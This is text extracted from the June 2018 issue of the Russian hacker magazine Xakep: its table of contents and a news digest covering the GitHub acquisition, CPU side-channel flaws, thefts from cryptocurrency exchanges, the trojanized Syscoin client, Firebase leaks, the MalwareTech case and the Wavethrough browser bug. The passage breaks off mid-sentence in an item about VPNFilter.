
                                               Июнь 2018
            № 231
CONTENTS

   MEGANEWS
  Всё новое за последний месяц

    Дайджест Android
  Лучшие гайды, библиотеки и инструмен ты месяца

   Шиф руйся грамот но!
  Почему мессен джеры не защитят тайну тво ей переписки

   Шиф руйся грамот но!
  Выбира ем мессен джер для безопасной и приватной переписки

    Самое крутое с мировых ИБ‐кон ференций
  Десять мощных докладов о взломе и реверсинге мик роэлек троники

    Разбираем атаки на Microsoft Active Directory
  Техники про никновения и детекта

    Тайна казначейского ноут бука
  Исполь зуем форен зику, что бы рас крыть ограбление

    Весеннее обостре ние
  Как работа ют две критические уязвимости в Spring Framework

     X‐Tools для Android
  Выбира ем ути литы для пен теста со смар тфона

    От мычки для соф та
  Выбира ем инстру мен ты ревер са и пен теста приложений для Android

    Смер тельный коммит
  Выполняем произволь ный код в клиенте git

    Безопасность iOS
  Что хорошо, что плохо и как ее усилить

    Пропуск в луковую стра ну
  Под нима ем Wi‐Fi с прок сирова нием тра фика клиентских устрой ств через Tor

    Обгоняя флагманы
  Боль шой гайд по опти миза ции Android

    Ли нукс‐сервер по цене биз нес‐ланча
  Учим ся разрабаты вать под одноплатный компьютер Omega‐2

    Русифицируем уточ ку
  Как зас тавить BadUSB работать с разными рас клад ками кла виатуры

   WWW
  Интересные веб‐сервисы

    Давай напишем ядро!
  Создаем прос тейшее рабочее ядро операционной системы

    Русский народный блок чейн
  Пишем простой локальный блокчейн с использованием «Стри бога»

    Дао хеша
  Поз наем дзен методически пра вильного хеширования паролей

    Брут форс в английской глубин ке
  Как крип тостойкие шифры вскрывали до компьютеров

     Тит ры
  Кто дела ет этот журнал

                                       Мария «Mifrill» Нефёдова
                                                    nefedova@glc.ru





MICROSOFT КУПИЛА
GITHUB
В начале июля 2018 года ста ло известно, что компания Microsoft покупает
крупнейший хостинг репозиториев GitHub за 7,5 миллиарда долларов. Мно‐
гих пользователей грядущая сделка не на шутку встре вожила, после чего
в Сети стали появ ляться петиции про тив слияния, а операторы GitLab, Bit‐
Bucket и SourceForge сообщили о зна чительном приросте трафика — раз‐
работчики тысячами перемещают свои проекты на дру гие хостинги.





Представители  Microsoft поспешили выпус тить официальное  заявление,
в котором сообщили, что осоз нают всю ответс твенность перед сообществом
разработчиков, практически не собираются вмешиваться в работу GitHub
и он продолжит независимое существование, по‐прежнему оставаясь пол‐
ностью открытым и бес платным. Однако речь также шла об использовании
GitHub для продвижения решений Microsoft, и сообщество, разумеется, инте‐
ресовали подробности.
  После слияния пост CEO GitHub получит Нэт Фридман (Nat Friedman),
в настоящее время один из вице‐президентов Microsoft. В компанию Фрид‐
ман попал после создания фирмы Xamarin, занимавшейся раз работкой
кросс‐платформенной имплементации .NET. В 2016 году Microsoft купила Xa‐
marin. Стоит отметить, что ключевая часть стека Xamarin была опенсорсной,
а еще одна компания, основанная Фридманом в девяностых, Ximian, и вовсе
была создана для разработки решений, связанных с GNOME.
   Текущий глава GitHub и один из соос нователей платформы, Крис Ванс‐
трас (Chris Wanstrath), сложит с себя полномочия и станет техничес ким кон‐
сультантом Microsoft. Вместе с Фридманом он будет работать под началом
исполнительного вице‐президента Скотта Гатри (Scott Guthrie), отвечающего
за Microsoft Cloud и развитие технологий искусс твенного интеллекта.





      Слева направо: Крис Ванстрас, Сатья Наделла, Нэт Фридман

Хотя Фридман еще не всту пил в новую должность, диалог с сооб щес твом он
начал уже сейчас. Вскоре пос ле официального объявления о гря дущей сдел‐
ке будущий CEO GitHub пообщался с поль зователями Reddit (в рамках серии
вопросов и ответов AMA). Как нет рудно догадать ся, в первую оче редь Фрид‐
ман хотел ответить на тревожа щие комьюни ти вопросы о слиянии компаний.
   Так  как  сделка еще  не  закрыта  (это  дол жно произойти до  кон‐
ца 2018 года), Фридман мог говорить не обо всем, однако общее представ‐
ление о планах Microsoft из его ответов получить все же возможно. Фридман
дал понять, что Microsoft, как и было заявлено ранее, не планирует серьезно
менять GitHub и вмешивать ся в его работу. Отвечая на вопрос о грядущих
переменах, Фридман написал, что «Microsoft покупа ет GitHub, потому что ей
нравится GitHub», а также стремится лишь к тому, чтобы «GitHub стал еще луч‐
ше как GitHub».
  При этом Фридман сообщил, что можно ожидать полной интеграции
с сервисами  Visual  Studio, но без каких‐либо радикальных изменений,
которые создадут неудобства пользователям. Будущий CEO заверил, что
работа над Atom и Visual Studio Code будет продолжена, так как разработчики
очень требовательны к своим инс трументам, и пользователи Visual Studio
Code определенно не будут рады, если их силой заставят перейти на Atom,
и наоборот.
  Конечно, Фридмана не могли не спросить о воз можном появлении рек‐
ламы в публичных репозиториях (ответ прост: ее не будет) и о том, как он
относится к отто ку поль зователей на GitLab и дру гие сервисы.



      «Раз работчики — люди  независимые  в  своих  суждениях,  люди,
      которые всегда име ют здоровую толику скеп тициз ма, но приз наю, я
     был  расс троен  тем,  что  некоторых  это  под толкну ло  полностью
      перемес тить свой код. Я беру на себя ответс твенность и серьезно
      пос тара юсь зас лужить их доверие», — отве тил Фрид ман.


БОЛЕЕ 7 000 000 IP‐АДРЕСОВ РАЗБЛОКИРОВАЛ
РОСКОМНАДЗОР

В начале 2018 года Роскомнадзор неожиданно вынес из реес тра запрещенных сай тов более
7 000 000 IP‐адресов, заблокированных в ходе борьбы с мессен дже ром Telegram. По данным
ресурса Usher2.Сlub, были разблокированы крупные под сети /10, /12 сервисов Amazon, а так‐
же подсеть хостинга Online.net 51.15.0.0/16.


Создатель Usher2.Club, генеральный директор хос тинг‐провайдера «Дремучий лес» Филипп
Кулин сообщил, что после снятия блокировки 76,5% по‐прежнему заблокированных IP‐адре‐
сов составляет Amazon AWS (это чуть меньше 3 000 000 IP‐адресов, или 10% всего адресно‐
го пространства Amazon AWS).

Еще 13% заблокированных адре сов принадлежат облачному хостингу DigitalOcean, 3,5% —
компании Microsoft.





ЕЩЕ БОЛЬШЕ БАГОВ
В ПРОЦЕССОРАХ
Обнаруженные в прошлом месяце но вые варианты уязвимостей Meltdown
и Spectre лишний раз доказали, что серьезные проблемы, связанные с side‐
channel‐атаками, еще не скоро останутся позади.
  В этом месяце исследователи расска зали сра зу о нескольких новых «про‐
цессорных» уязвимостях и возможных методах борь бы с атаками на такие
баги.


Lazy FP state restore
Эксплуатация проблем Meltdown и Spectre напрямую связана с тем, что все
современные процессоры используют архитектуру с вне очередным (out‐of‐
order) и одновременно упрежда ющим (или спекулятивным — speculative)
механизмом исполнения команд. Новая проб лема, получившая идентифика‐
тор CVE‐2018‐3665 и название Lazy FP state restore, также относится к side‐
channel‐атакам, связанным со спекулятивным исполнением команд.
  О новой бре ши в безопасности сооб щили сами инженеры Intel. За обна‐
ружение бага специалисты поблагода рили сот рудников Amazon Germany, Cy‐
berus Technology GmbH и SYSGO AG. Также они приз вали исследователей
и производителей пока не раз глашать детальную информацию о проблеме,
дав производителям и пользователям больше времени на выпуск и установку
патчей.
  Уже после выхода официальной публикации Intel собственные бюллетени
безопасности поспешили представить и дру гие разработчики, в том числе
RedHat, OpenBSD, DragonFlyBSD, Linux, Xen Hypervisor, Microsoft. Некоторая
несогласованность действий была выз вана тем, что команды OpenBSD
и DragonﬂyBSD рассказали о пат чах для новой проблемы раньше срока: Intel
планировала  скоординированно  раскрыть  детали  уязвимости  в  конце
июня 2018 года, но в ито ге была вынуждена перес мотреть планы.





CVE‐2018‐3665 представляет опас ность для процессоров  Intel Core, вне
зависимости от того, какая ОС уста новлена на проблемной машине. Уяз‐
вимые процессоры в любом случае используют функцию Lazy FPU context
switching, созданную для оптимиза ции произво дительности. Так, она поз‐
воляет операционным системам хра нить и восста навливать регис тры FPU
(Floating Point Unit, модуль операций с пла вающей запятой или точкой) только
в  случае необходимости.  Уязвимость поз воляет  сторонним процессам
получить доступ к этим регистрам и всем содержащимся в них данным.
  Инженеры Intel сооб щили, что проблема Lazy FP state restore во многом
похожа на Spectre, вариант 3а, и ее практичес ки невозможно экс плуати‐
ровать через браузеры, в отличие от бага Meltdown. Также разработчики
заверяют, что уязвимость уже была устранена во многих ОС и гипервизорах,
использующихся в самых раз ных кли ентах и решениях для дата‐центров.
В настоящее время про изво дители софта работают над патчами для еще
не обновленных продуктов, и исправления должны быть опубликованы в бли‐
жайшие недели.
   Хорошая новость заключается в том, что в данном случае баг не потребует
выпуска новых микрокодов для уязвимых процессоров и проблема решается
софтверными исправлениями.


TLBleed
В конце июня стали извес тны подробности о новой «процессорной» проб‐
леме TLBleed. Именно из‐за этой уяз вимос ти разработчики OpenBSD ре‐
шили отказаться от поддержки технологии Hyper‐Threading в процес сорах In‐
tel, о чем также стало известно в этом месяце. Подробный доклад о TLBleed
будет представлен в августе 2018 года на конференции Black Hat, а пока
с обнаружившими проб лему специалистами пообщались журналисты изда‐
ния The Register.
   Авторами доклада выступа ют исследова тели из Амстердамского свобод‐
ного университета. Они рас сказали журналистам, что обнаружили способ
обхода защиты буфера ассоциативной трансляции (Translation lookaside buf‐
fer, TLB).
   Баг позволяет извлекать криптографические клю чи и другие важные дан‐
ные из других запущенных программ, при чем коэффициент успешнос ти атаки
равняется минимум 98%. Точный результат зависит от используемого про‐
цессора: процент успешных атак при использовании Intel Skylake Core i7‐
6700K равен 99,8%, при использовании серверных процессоров Intel Broad‐
well Xeon E5‐2620 v4 — 98,2%, а про цес соры Coﬀeelake дают 98,8%.
  В частности, атака позволяет извлекать из сторонних программ 256‐бит‐
ные  криптографические ключи, используемые  для подписания данных,
во время выполнения операции подписи с помощью имплементации libgcrypt
Curve 25519 EdDSA. На подбор одного ключа (с использованием машинного
обучения и брут форса) в среднем требует ся лишь 17 секунд.
   TLBleed не связана со спекулятивным исполнением команд, то есть
не имеет отношения к нашумевшим уязвимостям Meltdown и Spectre. В дан‐
ном случае брешь связана со слабыми мес тами технологии Hyper‐Threading
и тем, как процессоры кеширу ют данные.
   Как нетрудно понять из наз вания, TLBleed атакует буфер ассоциативной
трансляции (Translation lookaside buﬀer, TLB), то есть специализированный
кеш процессора, используемый для ускорения трансляции адреса виртуаль‐
ной памяти в адрес физической памяти. От ранее известных side‐channel‐
атак на кеш TLBleed отличает то, что уже существу ющая защита от side‐chan‐
nel‐атак на кеш памяти не гарантиру ет защиты от слеж ки за TLB.
  Во время атаки на TLBleed происхо дит эксплуата ция собственной импле‐
ментации Intel для идеи одновременной мно гопо точности (Simultaneous Multi‐
Threading, SMT), также известной под маркетинговым названием Hyper‐
Threading. После включения Hyper‐Threading один физичес кий процес сор
и одно физическое ядро определяются операци онной системой как два
отдельных процессора и два логических ядра. В итоге процессор может
работать с несколькими потока ми одновременно (как правило, их количество
равно двум). При этом ресурсы и инфраструктура ядра остаются для потоков
общими, вклю чая и TLB.
  За счет использования общих ресурсов программы, запущенные на одном
ядре, могут «шпионить» за потока ми друг дру га. То есть откры вается воз‐
можность для исполнения так называемых атак по вре мени (timing attack) —
разновидности side‐channel‐атак, в ходе которой преступник пытается ском‐
прометировать систему с помощью ана лиза времени,  затрачиваемого
на исполнение тех или иных криптографичес ких алго ритмов. Так, один поток
может извлекать информа цию из другого, следя за таймингом обращений
к конкретным ресурсам и сравнивая эти данные с тем, как дол жно работать
атакуемое приложение (осно вываясь на его исходных кодах). Искусс твенный
интеллект, отслеживая изменения в TLB, помога ет опре делить, когда целевая
программа исполняет важные операции.
  Однако на деле все не так плохо, как может показаться. В частнос ти, одно
из условий реализации такой атаки — наличие в системе уже работающей
мал вари или вредоносного пользователя. Кро ме того, по данным исследова‐
телей, пока уязвимость не экс плуатируют какие‐либо злоумышленники и вряд
ли станут в будущем, ведь существу ет множество более простых способов
извлечения информации с компьютеров и дру гих устройств, тогда как эксплу‐
атацию TLBleed нельзя назвать тривиаль ной задачей.



      «Без  паники,  хотя  ата ка очень  кру тая,  TLBleed —  это не новая
       Spectre», —  заявил один  из  авторов  иссле дова ния жур налис там
      The Register.

При этом инженеры Intel сообщили, что не собираются выпускать каких‐либо
специальных патчей для устранения TLBleed. В компании полагают, что уже
существующих контрмер, направленных про тив side‐channel‐атак, впол не
достаточно для защиты от TLBleed, при условии, что разработчики будут
писать код правильно. В результате проб леме даже не был присвоен собс‐
твенный идентификатор CVE, и компания отказалась выплачивать исследова‐
телям вознаграждение по программе bug bounty, хотя отчет об уязвимости
был направлен Intel через плат форму HackerOne.
  Специалисты из Амстердамского сво бодного университета сооб щили
представителям The Register, что они не согласны с такой точкой зре ния. Они
подчеркивают, что идеальный софт, написанный как решение, устойчивое
перед любыми side‐channel‐ата ками, встречается крайне редко и бороться
с проблемой TLBleed исключительно с помощью хороших кодерских прак‐
тик — это вряд ли удачная идея.


SafeSpec
Но далеко не все ИБ‐специалисты заняты поиском новых уязвимостей. Свод‐
ная группа исследователей из Университета Калифорнии в Риверсайде, Кол‐
леджа Вильгельма и Марии, а также Бин гемтонского университета опуб‐
ликовала доклад о технике SafeSpec, которая позволит бороться с рисками,
связанными со спекулятивным исполнением команд, и атаками на такие уяз‐
вимости, как Spectre и Meltdown.
  Специалисты предлага ют изолировать все опас ные артефакты, которые
возникают в ходе спекулятивного исполнения команд, чтобы те не могли быть
использованы для получения доступа к привилегированным данным. Safe‐
Spec описывается как «принцип раз работки, когда спе кулятивные состояния
хранятся во временных структурах, недос тупных посредством committed
instructions».
   Эти временные, или «теневые», структуры, как их называют в докладе,
модифицируют иерархию памяти таким образом, чтобы спе куля тивные атаки
были  невозможны. Специалис ты  уверяют,  что  их методика  поз воляет
защититься от всех ныне известных side‐channel‐атак, экс плуатирующих раз‐
личные варианты проб лем Spectre и Meltdown, а также похожих проблем,
к примеру упомянутой Lazy FP.
   Авторы методики признают, что внедрение SafeSpec потребует от Intel
и  других  производителей  процессоров  внесения  глу боких  изме нений
для отделения спекулятивных структур от перманентных. Кроме того, при‐
менение SafeSpec потребует увеличения кеша L1, однако, по словам экспер‐
тов, аппаратные изменения все же будут минимальными.
   Если говорить о производительности, то авторы техники SafeSpec уве‐
ряют, что она может даже улучшить быстро действие систем, в отличие от пат‐
чей против Spectre и Meltdown, которые лишь замедляют работу компьюте‐
ров.
  Представите ли Intel пока никак не прокомментировали идею авторов Safe‐
Spec, так как инженеры компании впервые увидели доклад специалистов
одновременно со всем остальным миром.


ОСНОВАТЕЛЬ WIKIPEDIA ПОДЕЛИЛСЯ СВОИМ ВЗГЛЯДОМ
НА БУДУЩЕЕ КРИПТОВАЛЮТНОЙ ИНДУСТРИИ





→«В настоящее время все мы находим ся в пузыре. Крип томир абсолютно точно, без всяких
сомнений находится в пузыре. Не думаю, что найдется много людей, готовых это отрицать. Я
считаю, в этой области нам необходима настоящая журналис тика»
— основатель Wikipedia Джим ми Уэйлс на конференции BlockShow Europe 2018





                                     Продолжение статьи →
← Начало статьи
 КРИПТОВАЛЮТНЫЕ
 БИРЖИ ГРАБЯТ
  Преступления, так или ина че свя занные с криптовалю тами, в последнее вре‐
  мя стали одними из наиболее рас простра ненных и прибыльных для прес‐
   тупников. Однако в июне хакеры просто превзошли себя и стали при чиной
  сразу нескольких крупных про исшес твий.


  Ограбле ние Coinrail
  В середине июня 2018 года администра ция южно корей ской криптовалютной
  биржи Coinrail заявила о взло ме. С серверов компании были похищено
  порядка 30% всего аль ткойн‐портфеля биржи, в частнос ти ICO‐токены про‐
   ектов Pundi X (NPXS), NPER (NPER) и Aston (ATX).
       Coinrail можно назвать сравнительно небольшой биржей: она замыкает
  список топ‐100 по вер сии ресурса CoinMarketCap.
    Сразу после официального объявления об инциденте сайт биржи времен‐
  но прекратил работу, а все оставши еся 70% средств были перемещены
  на холодные кошельки. В настоящее время проводится рас следование слу‐
  чившегося, и разработчики Coinrail уверяют, что тесно сотрудничают с пос‐
   традавшими ICO‐проектами и дру гими обменниками и биржами, стремясь
  «заморозить» украденные токены и блокировать кошельки прес тупников.
  Сообщается, что совмес тными усилиями уже удалось блокировать почти две
  трети украденных средств.
     Хотя представите ли  Coinrail не озву чили точную сумму, оказавшуюся
   в руках неизвестных взломщиков, южнокорейское издание Yonhap и раз‐
  работчики Pundi X пишут, что ущерб составил порядка 40 миллиардов вон, то
   есть около 37 миллионов долларов США.


  Ограбле ние Bithumb
  Не успело криптовалютное сообщес тво оправить ся от известия о взломе
   Coinrail, как про изошло еще одно не менее масштаб ное ограбление. Вновь
  взломали одну из крупнейших криптовалютных бирж в мире, Bithumb. На этот
  раз неизвестные зло умышленники похитили 35 миллиардов вон, то есть око‐
  ло 31 миллиона дол ларов в криптовалюте. Согласно информации, размещен‐
  ной  на  официальном  сайте  Bithumb,  инцидент  произошел  в  ночь
  с 19 на 20 июня 2018 года.
    Пока операторы Bithumb не сооб щили никаких под робностей слу чив‐
  шегося, то есть неизвестно, какие именно крип товалюты были похищены,
  каким образом злоумыш ленники проникли в систему и как осуществили
  вывод средств. В социальных сетях и на крупных форумах, посвященных
  криптовалютам, появилась информация, что некото рые пользовате ли не дос‐
   читались токенов Ripple (RPX) на своих акка унтах, однако официальных под‐
  тверждений этому нет.
     Bithumb вре мен но приоста новила вывод средств, чтобы злоумышленни ки
  не могли вывести похищенные токены. Кроме того, все средства биржи были
  переведены в холодные (офлайновые) кошельки, вплоть до проведения тща‐
   тельного аудита и восстановления нормальной работоспособности систем.
     Представите ли Bithumb предупредили пользователей о том, что вре менно
  не нужно переводить на свои счета новые средс тва и пытаться совершать
  какие‐либо операции, так как транзакции могут быть потеряны системой. Так‐
  же компания заверила, что планирует компенсировать все потерянные поль‐
  зователями средства из собственных резервных фондов.
     Это  не  первое  ограбление,  жертвой  которого  стала  Bithumb.
  В июле 2017 года биржа уже подверга лась компрометации. Тогда со счетов
  ресурса было похищено неизвес тное количес тво Bitcoin и Ethereum.


  Взлом раз работчиков Syscoin
  Еще один инцидент, имевший мес то в этом месяце, не был связан с крип‐
  товалютными бир жами, одна ко имел пря мое отношение к криптовалюте
   Syscoin и воровству.
     Разработчики Syscoin предупредили пользователей о взломе своего акка‐
   унта на GitHub и официального репозитория про екта. Команда объяснила,
   что атакующие каким‐то обра зом сумели скомпрометировать одного из раз‐
  работчиков Syscoin и его учетные записи.
     9 июня 2018 года неизвес тные подменили вредоносной версией офи‐
  циальный клиент для Windows (версия 3.0.4.1), опубликованный на GitHub.
  Подмена оставалась незамеченной вплоть до утра 13 июня 2018 года, и в
  итоге нечто странное заподозрили не раз работчики, а пользователи. Дело
   в том, что установка зараженного клиента привлекла внимание Windows De‐
   fender SmartScreen и другого защитного ПО, которое уведомляло пострадав‐
  ших об обнаружении вредонос ной активнос ти.
     Все пользователи, загружавшие официальный клиент (файлы syscoincore‐
   3.0.4‐win32‐setup.exe и syscoincore‐3.0.4‐win64‐setup.exe) в указанный отре‐
   зок времени, оказались заражены малварью. Интерес но, что опубликованные
  на GitHub клиенты для Mac и Linux зло умышленники не тронули.
     Хакеры оснастили свою версию клиента мал варью Arkei Stealer, которая
  обнаруживается антивирусными решениями как Trojan:Win32/Feury.B!cl. Дан‐
  ный вредонос специализируется на обнаружении и похищении приватных
  клю чей от криптовалютных кошельков.
     Теперь всех пострадавших призывают срочно вос пользоваться антивирус‐
  ным ПО, а лучше переустановить с нуля ОС. Также представите ли Syscoin
  настоятельно советуют сменить пароли (желатель но действуя с «чистого»
  устройства).  Все  средства  на незашифрованных  кошельках,  а  также
  на кошельках,  которыми пострадавшие  поль зовались после  установки
  зараженной версии клиента, должны быть незамедлительно переведены
   в новые, свежесозданные кошельки. Все эти операции тоже рекомендуется
  выпол нять с хорошо защищенного компь ютера.
     Разработчики Syscoin принесли сооб щес тву свои извинения и пообещали,
   что теперь все сотрудники, у которых есть дос туп к GitHub, будут обя заны
  использовать двухфакторную аутентифика цию, а также всегда производить
  проверки сигнатур файлов перед заг рузкой.


 МОБИЛЬНЫЕ ПРИЛОЖЕНИЯ СЛИВАЮТ ДАННЫЕ ЧЕРЕЗ БД
  FIREBASE
  →Аналитики компании Appthority пре дупредили, что у множества разработчиков мобильных
   приложений возникают проблемы с нас тройкой баз данных Firebase и сопутствующих сер‐
   висов. Из‐за этого тысячи мобиль ных приложений допус кают утечки разнообразной информа‐
   ции, в том числе паролей, user ID, геолокационных данных и даже информации о финансовых
   и криптовалютных операциях.

   Аналитики изучили более 2 700 000 приложений для Android и iOS и выяви ли 28 502 про дукта
     (27 227 приложений для Android и 1275 для iOS), которые обращаются к Firebase и используют
   этот бэкенд.

  3046 приложений (2446 для Android и 600 для iOS) хранили данные внутри 2271 неп равильно
   настроенной БД Firebase, позволяя любому желающему прос матривать их содержимое.

   Уязвимыми оказались более 10% БД Firebase. Общий объем утечек сос тавил 113 Гбайт дан‐
   ных:

  2 600 000 паролей и user ID в формате простого текста;

  4 000 000+ закрытых медицинских дан ных (сообщения из чатов и детали рецептов);

  25 000 000 записей с GPS‐координатами;

  50 000 записей о различных финансовых операциях, включая банковские, платежные и крип‐
   товалютные транзакции;

  4 500 000+ пользовательских токенов Facebook, LinkedIn, Firebase и из корпоративных хра‐
   нилищ данных.

   «Дырявые» при ложения для Android были загружены из Google Play Store более 620 000 000
   раз, то есть среди изученных продуктов были и очень популярные.





 НОВЫЕ ПРОБЛЕМЫ
 MALWARETECH
  Проблемы с американскими властями начались  у британского ИБ‐спе‐
  циалиста Маркуса Хатчинса (Marcus Hutchins), более известного в Сети
  под псевдонимом MalwareTech, еще в августе прошлого года, во время
   визита на конференции Black Hat и DEF CON в Лас‐Вегасе. Хатчинса, который
  весной 2017 года в одиночку ос тановил рас пространение шифровальщика
  WannaCry, арестовали и обвинили в создании и распространении банковско‐
   го трояна Kronos в 2014–2015 годы.
    Первое заседание по делу Хатчинса состоялось 14 августа 2017 года.
  На суде исследователь заявил о своей невиновности по всем пунктам обви‐
   нения, а адвокаты MalwareTech выразили убежденность, что пос ле представ‐
  ления улик Хатчинс будет полностью оправдан. Так как, по мнению прокурора,
  исследователь более не представлял опасности, ему разрешили пользовать‐
  ся интернетом, а также позволили перебраться в Лос‐Андже лес, где рас‐
  положен офис компании Kryptos Logic, в которой он работает (впрочем,
  работать в США он не имеет пра ва с юридичес кой точки зрения). Тем
  не менее до окончания судебных раз бирательств специалист все равно
  не может покинуть страну и снять GPS‐трекер. За прошедший год эти обсто‐
   ятельства никак не изменились, и Хатчинс по‐прежнему вынужден оставаться
  на территории США.
     Как стало известно в начале июня, положение MalwareTech, к сожале нию,
  лишь продолжает ухудшаться. Согласно новой версии обвинительного зак‐
  лючения, к предыдущим обвинениям добавились еще четыре. Теперь Хат‐
  чинса обвиняют в создании и продаже не толь ко банкера Kronos, но еще
  и малвари UPAS Kit.
     Сторона обвинения заявляет, что UPAS Kit «использовал формграббер
  и веб‐инжекты, чтобы перехватывать и собирать данные с защищенных пер‐
  сональных компьюте ров», а также «позволял осущес твить неавторизованное
  извлечение данных с защищенных компь ютеров». Также следс твие утвержда‐
   ет, что в июле 2012 года MalwareTech про дал эту малварь человеку, известно‐
  му как Aurora123, который затем использовал вредонос для атак на аме‐
  риканских пользователей.
     Кроме того, обвинители считают, что после арес та, в августе 2017 года,
   Хатчинс на допросе лгал агентам ФБР. Тогда Хатчинс якобы заявил, будто
   вплоть до 2016 года и первого детального анализа Kronos он не знал, что
  ранее написанный им код является частью вредоно са (подробнее об этом
  аспекте мы рассказывали здесь). Как утвержда ют представители ФБР, позже
  специалист сознался, что в 2014 году он продал банкер пользователю, извес‐
   тному под ником VinnyK (это еще один псевдоним Aurora123), а значит, кос‐
  венно признал, что соврал во время первого допроса.
    При этом адвокаты Хатчинса нас таивают, что тогда их клиента допрашива‐
  ли в состоянии интоксикации, не давали ему спать, держали в пол ном
  неведении, не зачитали права и не предъ являли никаких обвинений. Юристы
  требуют исключения этих улик из дела как неприемлемых.
    Журналисты BleepingComputer обсудили новые обвинения в адрес Хат‐
  чинса с экспертом по правовым вопросам и незави симым журналис том Мар‐
  си Уиллер (Marcy Wheeler).



        «Обвинения в даче ложных показа ний — это самое луч шее, ведь
         в таком слу чае прокурора Невады тоже сле дует наз вать сообщником
         Хатчинса, так как его выс тупле ние в суде летом прош лого года пол-
        ностью  противоречит  заяв лениям  в  новом  обвинительном  зак-
         лючении», — говорит Уиллер.

   Также эксперт указывает на тот факт, что в упомяну тые годы, когда Хатчинс
   якобы создал и продал малварь UPAS Kit, он вооб ще был несовершеннолет‐
  ним и срок исковой давности (пять лет) в данном слу чае давно истек. То есть
  предъявлять эти обвинения специалис ту не должны были сразу по двум при‐
  чинам.
    Сам Маркус по‐прежнему старает ся не терять присутствия духа и тра‐
  диционно шутит о происходящем в своем Twitter. Так, исследователь пишет,
   что на услуги юристов уже было потрачено более 100 тысяч дол ларов (деньги
   Хатчинсу продолжают жертвовать неравнодушные пользовате ли и его кол‐
   леги со всего мира), а теперь из‐за новых обви нений опять «нужно больше
  минералов». Также он называет новые обвинения «херней».





 ОСНОВАТЕЛЬ КРИПТОВАЛЮТЫ TRON ПРИОБРЕЛ КОМ ‐
 ПАНИЮ BITTORRENT ЗА 120 000 000 ДОЛЛАРОВ
  →Известный блок чейн‐предприниматель и создатель криптовалюты Tron Джастин Сан (Justin
   Sun) приобрел ком панию BitTorrent, Inc., разрабатывающую популярнейшие клиенты μTorrent
   и BitTorrent.

   Сделка была зак рыта в начале июня 2018 года. По неофициаль ным дан ным, ее стоимость сос‐
   тавила 120 000 000 долларов США (изначально сообщалось о 140 000 000, но эту информа‐
   цию опроверг бывший глава BitTorrent Ашвин Навин).


   Представители BitTorrent уже опубликовали на сайте официальное заявление, согласно которо‐
   му компания не планирует изменять свою бизнес‐модель, заниматься майнингом, а тор‐
   рент‐клиенты не ста нут платными и их разработка будет продол жена.





 ШПИОНСКИЙ
 WAVETHROUGH
  Специалист компании Google Джейк Арчибальд (Jake Archibald) обнаружил
  критическую уязвимость, представляющую угро зу для ряда современных бра‐
   узеров. Проблема получила название Wavethrough и идентификатор CVE‐
   2018‐8235. Исполь зуя ее, вредонос ные сайты могут похищать информацию
  с других ресурсов, на которых пользователь залогинен в том же браузере.
  Для выполнения атаки дос таточно просто встроить в веб‐страницу вредонос‐
  ный видео‐ или аудиофайл, используя соответству ющие HTML‐теги.
     Корень проблемы Wavethrough лежит в области использования технологии
   Cross‐origin resource sharing (CORS, «совмес тное использование ресурсов
  между разными источниками»). CORS позволяет предоставить веб‐странице
  доступ к ресурсам другого домена.
     Арчибальд объясняет, что использование вредоносных service worker’ов
  позволяет  подгружать  мультимедийный  контент,  обозначенный  тегами
  <video> и <audio> , из удаленного источника, а использование параметра
   range позволит загрузить лишь какую‐то конкретную часть файла. Это было
  придумано для удобства загрузки больших медиафайлов или для случаев,
   когда скачивание файла оста новили, а затем продолжили.
    В нормальных обстоятельствах подоб ное поведе ние пресекает CORS.
  Браузеры давно запреща ют сайтам использовать cross‐origin‐запросы, обра‐
  щенные к другим доменам, без явно го на то раз решения. Однако эти огра‐
  ничения не распространяются на медиаконтент, размещенный в удаленном
  источнике. То есть возможно встроить на сайт аудио‐ или видеофайл с дру‐
   гого домена. В итоге при определенных условиях атакующие могут исполь‐
   зовать no‐cors‐запросы, которые многие сайты (включая Facebook, Gmail
  и BBC) пропустят без проблем.



         «Это озна чает, что, если вы откроете мой proof-of-concept сайт в бра-
         узе ре Edge, я смогу прочесть ваши письма или ленту Facebook
        без вашего ведома, — объясняет эксперт. — Баг появился, когда
         в бра узе рах реализова ли импле ментации range-зап росов для меди-
         аэле ментов, на которые не рас простра нялся стандарт. Эти range-зап-
        росы ока зались по‑нас тояще му полез ны, поэтому бра узе ры исполь-
         зовали их, копируя поведе ние друг дру га, но ник то так и не интегри-
         ровал это в стандарт».

  В итоге атака будет выглядеть следующим обра зом. Злоумышленник раз‐
  мещает на своем сайте медиаконтент, который при проигры вании загружа‐
   ется с этого сервера лишь частично. Затем сайт просит браузер извлечь
  оставшуюся часть файла из дру гого источни ка, при нуждая его выполнить
   cross‐origin‐запрос. Запрос, который должен быть запрещен, обрабаты вает‐
   ся, и атакующий получает возможность похитить пользовательские данные.
    Перед проблемой Wavethrough уязвимы не все браузеры, только Mozilla
   Firefox и Microsoft Edge. Chrome и Safari вне опас ности, и Арчибальд полагает,
   что в Chrome проб лема Wavethrough была устранена еще в 2015 году, по воле
   случая.  Тогда разработчики исправляли  дру гую  уязвимость,  связанную
  с параметром range и мультимедийным контентом.
    В настоящее время обновления выпущены для обо их уяз вимых браузе ров.
  При этом Арчибальду пришлось потрудиться, чтобы донести всю опасность
  проблемы до разработчиков Microsoft Edge. Подробно об этом специалист
  рассказал в своем блоге.
      Proof‐of‐concept атаки мож но увидеть здесь. Также исследователь соз дал
  специальный сайт, на котором пользователи уяз вимых вер сий Mozilla Firefox
  и Microsoft Edge могут посмотреть на демонстра цию работы бага своими гла‐
   зами.


 ЮРИСТЫ TELEGRAM ПОДАЛИ ВТОРУЮ ЖАЛОБУ
  Юристы правозащитной организации «Агора», представляющей инте ресы Telegram, подали
   вторую жалобу в Европейский суд по правам человека.





  →«В результате ограничения дос тупа к Telegram, возможность свободно распространять
   и получать информацию может потерять не только Заявитель [Telegram], но так же до 15 мил‐
   лионов пользователей могут лишиться доступа к безопасному сервису интернет‐коммуника‐
   ций, а также огромному архиву уникальной информации, которая не может быть получе на
   из других источников. Заявитель под черкивает, что в его деле рос сий ские влас ти даже
   не пытались установить баланс между необходимостью противодействия террориз му и обес‐
   печения общественной безопасности и защитой прав граждан на уважение частной жизни
   и права Заявителя на распространение информации»
  — глава «Агоры» Павел Чиков в своем Telegram‐канале





 VPNFILTER СТАЛ
 ОПАСНЕЕ
  Вредонос VPNFilter был обнаружен в мае текущего года. Сложная малварь
  заразила как минимум полмиллиона роутеров Linksys, MikroTik, NETGEAR
  и TP‐Link, а также NAS производства QNAP в 54 странах мира. Исследователи
   Cisco Talos, первыми расска завшие о малвари, подчеркивали, что VPNFilter —
